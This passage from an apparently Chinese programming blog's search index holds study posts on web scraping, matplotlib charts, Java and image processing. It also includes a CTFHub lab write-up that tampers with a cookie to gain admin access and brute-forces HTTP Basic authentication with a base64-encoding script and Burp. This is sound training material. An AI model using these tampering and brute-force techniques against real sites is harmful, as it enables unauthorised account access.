none;\">1589319&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator8\" style=\"display: none;\">48698&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator9\" style=\"display: table-cell;\">1.512&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator10\" style=\"display: none;\">1810&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator11\" style=\"display: none;\">126&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator12\" style=\"display: none;\">1697330&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator13\" style=\"display: none;\">302898&lt;/td>\n    &lt;td class=\"hidden-xs need-hidden indicator14\" style=\"display: none;\">6.81%&lt;/td>\n&lt;/tr>\n\n代码中每个td标签包含大学排名表格的一个列数值，于表头一一对应。因此要想获得其中的数据，需要首先找到&lt;tr&gt;&lt;/tr&gt;标签，并遍历其中的每一个&lt;td&gt;&lt;/td&gt;标签，获取其值写入程序的数据结构中。下面看看中国大学排名爬虫的实例：\n源代码import requests\nfrom bs4 import BeautifulSoup\nallUniv = []\ndef getHTMLText(url):\n    try:\n        r = requests.get(url, timeout=30)\n        r.raise_for_status()\n        r.encoding = 'utf-8'\n        return r.text\n    except:\n        return \"\"\ndef fillUnivList(soup):\n    data = soup.find_all('tr')\n    for tr in data:\n        ltd = tr.find_all('td')\n        if len(ltd)==0:\n            continue\n        singleUniv = []\n        for td in ltd:\n            singleUniv.append(td.string)\n        allUniv.append(singleUniv)\ndef printUnivList(num):\n    print(\"&#123;:^4&#125;&#123;:^10&#125;&#123;:^5&#125;&#123;:^8&#125;&#123;:^10&#125;\".format(\"排名\",\"学校名称\",\"省市\",\"总分\",\"培养规模\"))\n    for i in range(num):\n        u=allUniv[i]\n        print(\"&#123;:^4&#125;&#123;:^10&#125;&#123;:^5&#125;&#123;:^8&#125;&#123;:^10&#125;\".format(u[0],u[1],u[2],u[3],u[6]))\ndef main():\n    url = 'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html'\n    html = getHTMLText(url)\n    soup = BeautifulSoup(html, \"html.parser\")\n    fillUnivList(soup)\n    printUnivList(10)\nmain()\n\n\n运行效果![运行效果](https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/批注 2020-03-26 224457.png)\n通过这个运行效果，可以看到我们爬取到了需要的数据，但是有一个问题就是不对齐，阅读起来很累。这是因为细纹和中文字符占用位置宽度不同。所以还要优化优化，让他显示更加友好。\n优化代码#使用优化后的代码对源代码进行替换\ndef printUnivList(num):\n    print(\"&#123;1:^2&#125;&#123;2:&#123;0&#125;^10&#125;&#123;3:&#123;0&#125;^6&#125;&#123;4:&#123;0&#125;^4&#125;&#123;5:&#123;0&#125;^10&#125;\".format(chr(12288),\"排名\",\"学校名称\",\"省市\",\"总分\",\"培养规模\"))    #这里的chr(12288)代表的是中文全角空格\n    for i in range(num):\n        u=allUniv[i]\n        print(\"&#123;1:^4&#125;&#123;2:&#123;0&#125;^10&#125;&#123;3:&#123;0&#125;^5&#125;&#123;4:&#123;0&#125;^8.1f&#125;&#123;5:&#123;0&#125;^10&#125;\".format(chr(12288),u[0],u[1],u[2],eval(u[3]),u[6]))\n\n优化后的运行效果\n看起来舒服多了，这都是得益于使用格式化输出和统一字符，这里是统一使用了“中文全角空格”。格式化输出在排版时真的非发挥出很重要的作用。\n获取福建省高校排名修改输出函数，修改和main()函数里传入printUnivList()中num的值。\ndef printUnivList(num):\n    print(\"&#123;1:^2&#125;&#123;2:&#123;0&#125;^10&#125;&#123;3:&#123;0&#125;^6&#125;&#123;4:&#123;0&#125;^4&#125;&#123;5:&#123;0&#125;^10&#125;\".format(chr(12288),\"排名\",\"学校名称\",\"省市\",\"总分\",\"培养规模\"))\n    for i in range(num):\n        u=allUniv[i]\n        if str(u[2]) == '福建省':                                  #是福建省高校就输出\n            print(\"&#123;1:^4&#125;&#123;2:&#123;0&#125;^10&#125;&#123;3:&#123;0&#125;^5&#125;&#123;4:&#123;0&#125;^8.1f&#125;&#123;5:&#123;0&#125;^10&#125;\".format(chr(12288),u[0],u[1],u[2],eval(u[3]),u[6]))\n        else:\n            continue\n\n运行效果\n总结在这个爬虫实例中，学会了很多东西。首先要了解网页的源代码架构，这样才能更好的爬取到有效内容，其次还需要剔除掉一些无效的标签。要合理去利用格式化输出来实现，输出数据排版。这样就可以让数据的显示更加友好，这样也是更加有利于阅读的。使用网络爬虫可以更加快捷和直观的去爬取一些数据。\n","slug":"中国大学排名爬虫","date":"2020-03-26T11:26:48.000Z","categories_index":"Python学习","tags_index":"Python,WEB","author_index":"A1andNS"},{"id":"d2c6d2646ec298cd40f48630ec04271a","title":"Python之网络爬虫与自动化","content":"今天来学习一下Python语言如何进行网络爬虫和自动化。\nPython语言提供了很多可供使用的第三方库，包括urllib、urllib2、urllib3、wget、scrapy、requests等。这些库都会是好帮手。最经常看到的就是requests库了。\n\n\n\n\n\n\n\n\n\n网络爬虫应用一般分为两个步骤：\n\n通过网络链接获取网页内容\n对获得的网页内容进行处理\n\n说到爬虫还有一个Robots排除协议，也就是爬虫协议，它是网站管理员表达是否希望爬虫自动获取网络信息意愿的方法。管理者一般都会在网站根目录下放置一个robots.txt 文件，并在里面列出哪些链接不允许爬虫爬取。在CTF的WEB解题中也经常会用到robots.txt文件，比如查看一些目录。\nrequests库的使用\n\n\n\n\n\n\n\n\nrequest库是一个简洁且简单的处理HTTP请求的第三方库\nrequests库简介request库是一个简洁且简单的处理HTTP请求的第三方库，最大优点就是程序编写过程接近正常的URL访问过程。这个库是建立在Python语言的urllib3库的基础上，这可能也是Python的特色，在第三方库基础上开发更友好的库，一切都得益于开源。\nrequests库支持很多丰富的链接访问功能，包括国际域名和URL获取、HTTP长连接和链接缓存、HTTP会话和Cookie保持等。更多有关信息开源去requests的官方介绍网页查看。\nrequests库解析\n HTTP 协议中 get 功能单纯的从服务器获取数据，服务器中网站数据不可能变化。post 功能可以通过提交表单修改网站的数据（比如注册），网站数据可能变化。\n在HTTP请求后会返回一个response对象，值得一提的是encoding属性很重要，他决定了编码方式。在中文无法显示时就要通过更改response对象的encoding属性来查看中文字符。\npost()函数使用起来时，提交的数据要用字典类型来实现。例如requests.post(url,data = &#123;&quot;username&quot;:&quot;admin&quot; , &quot;password&quot;:&quot;123&quot;&#125;)\nraise_for_status()方法也是一个很好用的东西，开以用来避开状态字200以外的各种意外情况。requests会产生几种常用异常。当遇到网络问题时，如DNS查询失败、拒绝连接等，requests会抛出ConnectionError异常；遇到无效HTTP响应时，requests会抛出HTTPError异常；若请求url超时，就抛出Timeout异常；若请求超过了设定的最大重定向次数，就会抛出一个TooManyRedirects异常。\n获取HTML网页#这是一个获得HTML网页的通用代码\nimport requests\ndef getHTMLText(url):\n    try:\n        r = requests.get(url, timeout=30)\n        r.raise_for_status()    #如果状态不是200，引发异常\n        r.encoding =  'utf-8'    #无论原来用什么编码，都改为UFT-8\n        return r.text\n    except:\n        return \"\"\nurl = input(\"请输入URL:\")\nprint(getHTMLText(url))\n\nrequests库主要解析方法#requests.request(method, url, **kwargs)\n#**kwargs为可选项，主要是控制访问的参数\n#params:字典或字节序列，作为参数增加到url中\n#data:字典或字节序列或文件对象，作为request的内容\n#json:JSON格式的数据作为request的内容\n#headers: 字典，HTTP定制头\n#cookies:字典或cookieJar，request中的cookie\n#auth:元组类型，支持HTTP认证功能\n#file:字典类型，传输文件\n#案例：\nfs = &#123;\"file\": open('data.xls', 'rb')&#125;\nr.requests.request('POST', 'http://python123.io/ws', files=fs)\n#timeout:设定超时时间，以秒为单位\n#proxies：字典类型，设定访问代理服务器，可以增加登陆认证。\n#案例：\npxs = &#123; 'http': 'http://user:pass@10.10.10.1:1234',\n      'https': 'https://10.10.10.1:4321'&#125;\nr = requests.request('GET', 'http://www.baidu.com', proxies=pxs)\n#allow_redirects: True/False,默认为True，重定向开关\n#stream: True/False,默认为True，获取内容立即下载开关\n#verify: True/False,默认为True，认证SSL证书开关\n#cert: 本地SSL证书路径\n\nbeautifulsoup4库的使用\n\n\n\n\n\n\n\n\nbeautifulsoup4库时一个解析和处理HTML和XML的第三方库。\nbeautifulsoup4库概述使用requests库获取到HTML页面并将其转换为字符串后，需要进一步解析HTML页面的格式，提取有用的信息，这就需要处理HTML和XML的函数库。\nbeautifulsoup4库，也被称为bs4库，用来解析和处理HTML和XML。但是要注意一点，他不是BeautifulSoup类。它最大的优点是能够根据HTML和XML语法构建解析树，进而高效解析其中的内容。\nbeautifulsoup4库是采用面向对象思想实现的，他把每一个网页作为一个对象，通过.的方式来调用对象属性，或者使用.()来调用方法。所以再需要进行引用时可以使用from-import方式直接引用BeautifulSoup类。具体的介绍可以去访问这个第三方库的主页\nbeautifulsoup4库解析\n在bs4里最主要的就是BeautifulSoup类，每个实例化的对象都相当于一个页面。采用from-import导入库中的BeautifulSoup类后使用BeautifulSoup()就可以创建一个BeautifulSoup对象了。如下图：\n\nBeautifulSoup对象时一个树形结构，包含HTML页面中的每一个Tag元素，HTML中的每一个Tag都成为了BeautifulSoup对象的一个属性，可以使用面向对象方法来获取属性。属性名就是Tag名。而且HTML里面的每一个标签也是一个Tag对象。并且可以创建一个Tag对象，如下图所示：\n\nTag对象的属性就是每一个Tag所拥有的部分，像尖括号内标签的名字为name、尖括号内的其他项为attrs、尖括号之间的为string。如下图所示：\n\n直接使用soup.a是只能返回第一个a标签的，而由于HTML语法的嵌套，所以一个标签里可能还有别的标签，这里有一点要注意，string属性的返回值要遵循如下的原则：\n\n\n\n\n\n\n\n\n\n\n如果标签内部没有其他标签，string属性返回其中的内容。\n如果标签内部还有其他的标签，但是只有一个标签，string属性返回最里面标签的内容。\n如果标签内部有超过1层嵌套的标签，string属性返回None。\n\n如果想要列出标签对应的所有内容或者需要找非第一个标签，就要用到BeautifulSoup的find()和fing_all()方法来实现。find()方法返回找到的第一个结果，find_all()方法返回找到的所有结果。\nBeautifulSoup.find_all(name, attrs, recursive, string, limit)\n\n要把这些库结合运用起来，编写一个爬虫程序，就可以爬取内容或者获取想要的信息，而且可能会更加高效。\n","slug":"Python之网络爬虫与自动化","date":"2020-03-26T01:55:21.000Z","categories_index":"Python学习","tags_index":"Python,WEB","author_index":"A1andNS"},{"id":"8ab514a135a5a3eda795763cee6202a4","title":"乒乓球参数雷达图","content":"今天写一个乒乓球和参数雷达图，这个和昨天的程序原理和流程基本是一样的们就是更换了data内容和angles内容。\n下面看代码：\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\n第三方库: matplotlib 、numpy\n源代码import numpy as np\nimport matplotlib.pyplot as plt\nimport matplotlib\n\nmatplotlib.rcParams['font.family']='SimHei'\nmatplotlib.rcParams['font.sans-serif']=['SimHei']\nradar_labels = np.array(['爆发力','技巧熟练度','气势','稳定性','速度'])\nnAttr = 5\ndata = np.array([[0.8,0.9,0.9,0.75],[0.85,0.87,0.9,0.9],[0.9,0.6,1.0,0.6],[0.8,0.7,0.7,0.9],[0.6,0.9,0.9,0.92]])\ndata_labels = ('李四','张三','王五','乐乐')\nangles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)\ndata = np.concatenate((data,[data[0]]))\nangles = np.concatenate((angles,[angles[0]]))\nfig = plt.figure(facecolor= 'white')\nplt.subplot(111,polar = True)\nplt.plot(angles, data, 'o-', linewidth=1.5, alpha = 0.2)\nplt.fill(angles, data, alpha = 0.2)\nplt.thetagrids(angles*180/np.pi, radar_labels)\nplt.figtext(0.05, 0.97, '乒乓球运动员参数雷达图',ha = 'center',size= 15)\nlegend = plt.legend(data_labels, loc = (0.9,0.92),labelspacing =0.1)\nplt.show()\n\n运行效果\n这样乒乓球运动员参数雷达图就呈现出来了，可以通过图来看出运动员能力的偏向性。\n","slug":"乒乓球参数雷达图","date":"2020-03-26T01:12:55.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"6aeed6848c64f0094aa75f684b01936e","title":"霍兰德人格分析雷达图","content":"今天学习了一个霍兰德人格分析雷达图绘制，和昨天的雷达图一样也是利用matplotlib库来进行绘制，利用了极坐标系来实现雷达图绘制。下面看代码：\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\n第三方库: matplotlib 、numpy\n源代码import numpy as np\nimport matplotlib.pyplot as plt\nimport matplotlib\nmatplotlib.rcParams['font.family']='SimHei'\nmatplotlib.rcParams['font.sans-serif'] = ['SimHei']\nradar_labels = np.array(['研究型(I)','艺术型(A)','社会型(S)','企业型(E)','常规型(C)','现实型(R)'])\nnAttr = 6\ndata = np.array([[0.40, 0.32, 0.35, 0.30, 0.30, 0.88],\n                 [0.85, 0.35, 0.30, 0.40, 0.40, 0.30],\n                 [0.43, 0.89, 0.30, 0.28, 0.22, 0.30],\n                 [0.30, 0.25, 0.48, 0.85, 0.45, 0.40],\n                 [0.20, 0.38, 0.87, 0.45, 0.32, 0.28],\n                 [0.34, 0.31, 0.38, 0.40, 0.92, 0.28]]) #数据值\ndata_labels = ('工程师', '实验员', '艺术家', '推销员', '社会工作者','记事员')\nangles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)\ndata = np.concatenate((data, [data[0]]))\nangles = np.concatenate((angles, [angles[0]]))\nfig = plt.figure(facecolor=\"white\")\nplt.subplot(111, polar=True)\n#plt.plot(angles,data,'bo-',color ='gray',linewidth=1,alpha=0.2)\nplt.plot(angles,data,'o-', linewidth=1.5, alpha=0.2)\nplt.fill(angles,data, alpha=0.25)\nplt.thetagrids(angles*180/np.pi, radar_labels)\n#原本上行为plt.thetagrids(angles*180/np.pi, radar_labels, frac=1.2)\nplt.figtext(0.52, 0.95, '霍兰德人格分析', ha='center', size=20)\nlegend = plt.legend(data_labels, loc=(0.94, 0.80), labelspacing=0.1)\nplt.setp(legend.get_texts(), fontsize='small')\nplt.grid(True)\nplt.show()\n\n说明上面这个源代码可以正常执行，但是这取决于你所安装的matplotlib库的版本，最新版本时可以没有问题去执行的。原本这个程序的代码中关于plt.thetagrids()中会有一个frac属性。但是由于我的matplotlib版本是最新版本了，所以在这个plt.thetagrids()中式没有frac属性的。所以结果就是报错了。把我给搞蒙了，后来试着把frac属性删除，运行居然可以正常运行，故而去查了一下，原来是新版frac已被取消。\n这个图形绘制相比昨天的雷达图绘制而言，绘制的图线条数更多，所以使用了二维数组来解决问题。使用雷达图确实是很有利于数据分析，直观明显。\n运行效果\n\n","slug":"霍兰德人格分析雷达图","date":"2020-03-25T01:58:14.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"456b78bd2f6a936f65e0a4e37e1d2809","title":"Python之多级雷达图绘制","content":"雷达图时通过多个离散属性比较对象的最直观工具，我也经常看到雷达图，在游戏中，每个角色都会有一个能力值的雷达图，或者在某些竞技游戏中也会有对局分析，多数情况下也是使用雷达图来实现的。\n下面就来学习绘制一个多级雷达图：\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\n第三方库: matplotlib 、numpy\n源代码import matplotlib.pyplot as plt\nimport numpy as np\nimport matplotlib\n\nmatplotlib.rcParams['font.family'] = 'SimHei'    #设置字体\nmatplotlib.rcParams['font.sans-serif'] = ['SimHei']    #设置字体\nlabels = np.array(['综合','KDA','发育','推进','生存','输出'])    #设置标签\nnAttr = 6                                                                                   #多边形的边数\ndata = np.array([7,5,6,9,8,7])     #数据值\nangles = np.linspace(0,2*np.pi,nAttr,endpoint=False)     #2Pi分6份\ndata = np.concatenate((data,[data[0]]))              #首位相连\nangles = np.concatenate((angles,[angles[0]]))    #首位相连\nfig = plt.figure(facecolor=\"white\")                                 #设置背景色\nplt.subplot(111,polar=True)                 #就设置一个区域，polar为极坐标\nplt.plot(angles,data,'bo-',color = 'g',linewidth=2)    #绘制图线\nplt.fill(angles,data,facecolor='g',alpha=0.25)       #填充色彩\nplt.thetagrids(angles*180/np.pi,labels)\nplt.figtext(0.52,0.95,'DOTA能力值雷达图',ha='center')    #设置标题\nplt.grid(True)                         #打开坐标网格\nplt.savefig('dota_radar.JPG')\nplt.show()\n\n效果图\n总结这种绘图经常被用于游戏中，或者成绩、性格分布情况。主要是倾向性情况统计用。可以直观地看出某方面的倾向性。在绘制时用到了极坐标系，真是极坐标的存在让雷达图绘制就如同绘制函数一样。\n","slug":"Python之多级雷达图绘制","date":"2020-03-24T02:02:24.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"439b59e344fc9da785bc717e07f565f5","title":"Python学习之坐标图绘制","content":"今天学习了一下matplotlib绘制坐标图的相关内容，原来就听说过Python适合数据科学，果然如此。通过matplotlib库可以绘制出函数图形，还可以对某些区域进行阴影化处理，这对于函数绘制和科学计算很有帮助。Python果然是让人喜爱。\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\n第三方库: matplotlib 、numpy\n源代码import numpy as np\nimport matplotlib.pyplot as plt\nimport matplotlib\nmatplotlib.rcParams['font.family']='SimHei'\nmatplotlib.rcParams['font.sans-serif'] = ['SimHei']\n\ndef Draw(prolor,nt_point,nt_text,nt_size):             #函数绘制\n    plt.plot(x,y,'k',label=\"$exp_decay$\",color=prolor,\\\n    linewidth=3,linestyle=\"-\")\n    plt.plot(x,z,\"b--\",label=\"$cos(x^2)$\",linewidth=1)\n    plt.xlabel('时间(s)')\n    plt.ylabel('幅度(mV)')\n    plt.title(\"阻尼衰减曲线绘制\")\n    plt.annotate('$\\cos(2\\pi t)\\exp(-t)$',xy=nt_point,\\     #注释文字\n    xytext=nt_text,fontsize=nt_size,arrowprops=\\\n    dict(arrowstyle='->',connectionstyle=\"arc3,rad=.1\"))\n\ndef shadow(a,b):                                                              #阴影绘制\n    ix = (x>a) &amp; (x&lt;b)\n    plt.fill_between(x,y,0,where=ix,facecolor='grey',alpha=0.25)\n    plt.text(0.5* (a+b),0.2,r\"$\\int_a^b f(x)\\mathrm&#123;d&#125;x$\",\\\n    horizontalalignment='center')\n\ndef XY_Axis(x_start,x_end,y_start,y_end):         #修改坐标系\n    plt.xlim(x_start,x_end)\n    plt.ylim(y_start,y_end)\n    plt.xticks([np.pi/3,2*np.pi/3,1*np.pi,4*np.pi/3,\\\n    5*np.pi/3],['$\\pi/3$','$2\\pi/3$','$\\pi$','$4\\pi/3$','$5\\pi/3$'])\n\nx = np.linspace(0.0,6.0,100)\ny = np.cos(2 * np.pi *x)*np.exp(-x)+0.8\nz = 0.5*np.cos(x**2)+0.8\nnote_point,note_text,note_size=(1,np.cos(2*np.pi)*\\\nnp.exp(-1)+0.8),(1,1.4),14\nfig = plt.figure(figsize=(8,6),facecolor=\"white\")\nplt.subplot(111)\nDraw(\"red\",note_point,note_text,note_size)\nXY_Axis(0,5,0,1.8)\nshadow(0.8,3)\nplt.legend()\nplt.savefig(\"sample.JPG\")                                            #保存为文件\nplt.show()\n\n运行效果\n可以看到绘制出的函数图像让人满意，Python在科学计算方面的优越真的是不可不说。\n疑惑与解答$$\\cos(2 \\pi t)\\exp(-t)$$\n这是一个公式，但是在这个Python程序中如何去编写它呢？一开始我一直没有懂代码里面的写法。后来上网学了一下才知道原来这个是LaTeX的数学公式写法。\nLaTeXLaTeX是一种基于TeX的文档排版系统,把大片排版的格式细节隐藏在若干样式之后，以内容的逻辑结构统帅纷繁的格式，遂成为现在最流行的科技写作——尤其是数学写作的工具之一.在Markdown中插入数学公式的语法是 $数学公式$ 和 $$数学公式$$.\n行内公式格式：$数学公式$ \n行内公式是可以让公式在文中与文字或其他东西混编，不独占一行。在行内公式里，在数学模式下,符号会使用单独的字体,字母通常是倾斜的意大利体,数字和符号则是直立体.而且,数学符号之间的距离也与一般的水平模式不同，所以应该要使用数学公式来表示。\n不然就是这个的效果：cos(2pit)exp(-t)，看起来就没有数学公式的样子了。\n独立公式格式：$$数学公式$$\n独立公式单独占一行,不和其他文字混编。在多方公式中使用\\\\来换行\n例如：\n$$\n12x+5y=33\\\\\nx+\\cos(2\\pi t)\n$$\n\n\n\n效果：$$12x+5y=33\\x+\\cos(2\\pi t)$$\n总结学习了一下如何去绘制一个坐标系图，主要是通过一些matplotlib库的函数和方法调用来实现。而书写注释文本时，要善于使用LaTeX格式来书写数学表达式，这样才可以有更好的显示效果。\n","slug":"Python学习之坐标图绘制","date":"2020-03-23T14:20:26.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"db14ed79e25e2047bb8e4e5987ac7f7d","title":"CTFHub Study Notes之WEB前置技能","content":"最近从学长那里听说了一个新上线的网站CTFHub感觉挺不错了，技能树，比赛日历，工具都有。感觉真的降低了CTF入门门槛。所以赶紧技能树上学习一下。\nWEB前置技能之HTTP Protocol请求方法打开环境是一个提示：\n\n他要求我们使用CTFHUB方法来访问这个网页，所以我使用了burpsuite抓包转到repeat修改GET为CTFHUB，发送就会在响应html里面看到Flag了。\nFlag：ctfhub{a409e8f53e716af57704afb09005258c61455c34}\n302跳转打开网页就是一个flag不在这里，然后给你一个链接按钮，所以使用burpsuit抓包看看，点击按钮，抓到了一个请求包，转到repeat，重发，flag就出现在眼前。多亏了burpsuit不显示重定向内容，一下就拿到了flag。\n这题主要就是考察302状态码。302重定向又称之为暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向（temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。\nCookie打开网页提示“你好游客，只有管理员才可以得到Flag”\n这就是在考身份识别，一般web程序是通过cookie来判断访问者身份的。所以我看来一下Cookie，发现Cookie值为admin=0.\n\n这个很明显，那我就用burpsuit吧cookie改为admin=1，重发。\n\n这样就得到Flag是ctfhub{e77b75702bf48f5d0e7ae439a59c04af7435f82f}\n基础认证知识在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。在进行基本认证的过程里，请求的HTTP头字段会包含Authorization字段，形式如下： Authorization: Basic &lt;凭证&gt;，该凭证是用户和密码的组和的base64编码。\nGET /private/index.html HTTP/1.0\nHost: localhost\nAuthorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n（来源自Wikipedia）\n\n解题了解了这个HTTP请求头字段的语法结构后，开始解题了。\n\n点开看看什么情况\n\n弹框要用户密码，这里很明显用户名是admin，密码是什么，我不知道，看看题目的附件\n\n\n是密码字典。我得写一个脚本，把base64文本转换出来。\nimport base64\n \nf=open('1.txt','r')\nt=open('2.txt','w')\nlines=f.readlines()\nfor line in lines:\n    AU=\"admin:\"+line.strip('\\n')\n    AU64=base64.b64encode(AU.encode('utf-8'))\n    AU2 = str(AU64,'utf-8')\n    print(AU2)\n    t.write(AU2)\n    t.write(\"\\n\")\n \nf.close()\nt.close()\n'''\npython3中字符默认为Unicode所以直接使用base64.b64encode(AU)会报错，所以就要先把AU转换为UTF-8编码，在进行base64处理，写入也是一样的要先转换成字符串，才可以写入文件。\n'''\n\n\n然后使用burpsuit去爆破。\n\n发现一个状态码为200的数据包，打开看一下。\n\nFlag就出现了\n\nFlag就是ctfhub{380cc962a1f1e144aebae39f25a1e1bcd2d0de94}\n响应包源代码考察HTTP响应包源代码查看。直接抓包看响应源代码，发现Flag被注释在响应源代码里。\nFlag就是\nctfhub{544027f05162a779f19331e384dd1233a56d4dbe}\n","slug":"CTFHub-Study-Notes之WEB前置技能","date":"2020-03-21T11:22:05.000Z","categories_index":"CTF","tags_index":"网络安全,WEB","author_index":"A1andNS"},{"id":"1cbaef790a7e9f45426aa60a0be84446","title":"Java的开始","content":"最近开始学习Java程序设计了，说是面向对象的程序设计。面向对象确实是要好好研究了，面向过程编程是注重解决问题的步骤，而面向对象编程则是侧重于模块化组成也就是构成吧。所以大多数的大的团队项目都是使用java去进行的，就是看重面向对象的特性，大家可以分别专门专注于一个对象的面向过程编程，编程效率高了。\n我的第一个Java程序简单的一个输入什么内容，就输出什么内容。真的很简单。。。\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nJava: 1.8.0_171\n库：java.util\n源代码import java.util.*;\n\npublic class FromTo &#123;\n\n\tpublic static void main(String[] args) &#123;\n\t\tScanner reader = new Scanner(System.in);\n\t\tString b = reader.nextLine();\n\t\tString a = b;\n\t\twhile (!b.equals(\"exit\") &#123;\n\t\t\tSystem.out.println(a);\n\t\t\ta = reader.nextLine();\n\t\t\tb = a;\n\t\t&#125;\n\t\treader.close();\n\t&#125;\n&#125;\n\n运行效果\n问题1、我这个其实还不太清楚，还没有学到循环结构，语法有点不太清楚，while里的bool表达式不知道为什么没法触发。有点懵，这样就只能用Ctrl+C来终止程序了。\n因为我是像C语言里面那样写的，但是在Java中那样的意思是是否指向同一个对象，所以要利用equals()方法来进行字符串之间的对比。所以就用了!b.equals(&quot;exit&quot;).\n身为Java新手，还有很多东西要学啊！认真学习吧！\n","slug":"Java的开始","date":"2020-03-21T10:37:06.000Z","categories_index":"Java学习","tags_index":"Java","author_index":"A1andNS"},{"id":"cdd861cd2922639e00d6f22270fb4af9","title":"Python之字符画","content":"今天学习了一下字符画，也就是把图像转换为灰度图，然后把灰度值均匀分配到每一个字符上，这里字符设置要有梯度，这样才可以绘制出层次感的图片，不然就是一片黑了。\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\n第三方库: PIL \n源代码from PIL import Image \nunicode_char = list('一二十人八工子口入儿九三七六文李写中龙牛字化画羊鸭马妞件雅解鑫磊晶龍释源缩麑') \ndef get_char(r,g,b, alpha = 256): \n    if alpha == 0: \n        return ' ' \n    gray = int(0.2126*r + 0.7152*g + 0.0722*b) \n    unit = 256/len(unicode_char) \n    return unicode_char[int(gray // unit)] \ndef main(filename): \n    im = Image.open(filename,\"r\") \n    WIDTH, HEIGHT = 100,60 \n    im = im.resize((WIDTH, HEIGHT)) \n\n    txt = '' \n    for i in range(HEIGHT): \n        for j in range(WIDTH): \n            txt += get_char(*im.getpixel((j,i)) )\n        txt += '\\n' \n    filename = filename.replace(\".\",\"\")\n    fo = open('pic_'+filename + '.txt', 'w') \n    fo.write(txt) \n    fo.close()\n    ans = open('pic_'+filename + '.txt',\"r\")\n    ans1 =ans.read()\n    print(ans1)\n    ans.close() \nfilename = input(\"请输入相对路径：\")\nmain(filename) \n\n运行效果\n\n总结这个还是很有趣的，我也就是这样写写，字符还可以更加多样化，这样的话出来的效果会更好。\n","slug":"Python之字符画","date":"2020-03-21T10:11:31.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"4e8ff3967bb7de3a29626350f1a5e478","title":"Python之手绘滤镜","content":"昨天学习了Python图像处理方面的手绘滤镜，算是科学计算的一部分，感觉挺牛的。\n运行环境\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\n第三方库: PIL 、numpy\n源代码from PIL import Image\nimport numpy as np\nvec_el = np.pi/2.2  #光源的俯视角度，弧度值\nvec_az = np.pi/4.   #光源的方位角度，弧度值\ndepth = 10.\nim = Image.open(\"1.jpg\").convert(\"L\")\na = np.asarray(im).astype(\"float\")\ngrad = np.gradient(a)   #取图像灰度的梯度值\ngrad_x ,grad_y = grad   #分别取横纵图像梯度值\ngrad_x = grad_x*depth/100.\ngrad_y = grad_y*depth/100.\ndx = np.cos(vec_el)*np.cos(vec_az)      #光源对x轴的影响\ndy = np.cos(vec_el)*np.sin(vec_az)      #光源对y轴的影响\ndz = np.sin(vec_el)                     #光源对z轴的影响\nA = np.sqrt(grad_x**2 + grad_y**2 + 1.)\nuni_x = grad_x/A\nuni_y = grad_y/A\nuni_z = 1./A\na2 = 255*(dx*uni_x+dy*uni_y + dz*uni_z)         #光源归一化\na2 = a2.clip(0,255)\nim2 = Image.fromarray(a2.astype(\"uint8\"))       #重构图像\nim2.save('new.jpg')\n\n运行效果\n\n乍一看和手机上提供的滤镜还真是差不多。\n说明depth参数的值是用于调节灰度值和梯度值之间的对应关系，当depth参数较小时，背景区域接近白色，画面显示轮廓描绘。depth较大时，整体画面灰度值较深，近似于浮雕效果。\n图像转换对应的ndarray类型是三维数据，前两维表示图像的长度和宽度，单位是像素，第三维表示每个像素点的RGB值，每个RGB值是一个单字节整数。\n","slug":"Python之手绘滤镜","date":"2020-03-21T03:26:43.000Z","categories_index":"Python学习","tags_index":"Python","author_index":"A1andNS"},{"id":"c80c1d769a8b31ed25cb5954f7a75550","title":"Python之You-Get库学习","content":"今天学习一下You-Get这个第三方库，体验一下视频下载的快乐。\n简介You-Get库是一个基于Python3的视频下载工具，支持多数国内外主流视频站点的视频下载。看一下项目主页的README.md,真的是十分的nice啊，基本都支持了，像B站、腾讯视频、土豆、优酷等等。\n项目主页：https://github.com/soimort/you-get\n\n安装安装有三种方法，可以再github主页下载安装，也可以用pip下载，还可以用Antigen安装。\n我在这里使用的是pip安装，使用pip3 intall you-get命令来安装you-get库。\n\n由于pip更换了国内源，很快就完成安装了。\n实例接下来就来体验一把这个you-get库的实力，那么就编一个实例来在B站上下个视频看看。\n\n\n\n\n\n\n\n\n\n系统：Windows 10 version 1909\nPython：Python 3.7.4\nYou-Get： You-Get 0.4.1410\n第一种就是直接使用命令行执行下载视频使用命令you-get -o 存储路径 URL , 注意一点URL不可以使用’’包起来，不然就会报错。\n\n可以看到这个视频已经安详地躺在了目录下。\n\n查看视频信息使用命令you-get -i https://www.bilibili.com/video/av10298843?from=search&amp;seid=17023892018446291553\n\n第二种是通过编写Python程序实现批量的下载写了一个小程序，不多说上代码\n源代码import os\n\ndef main():\n    info()\n    tag = input(\"请选择：\")\n    if tag == 'a':\n        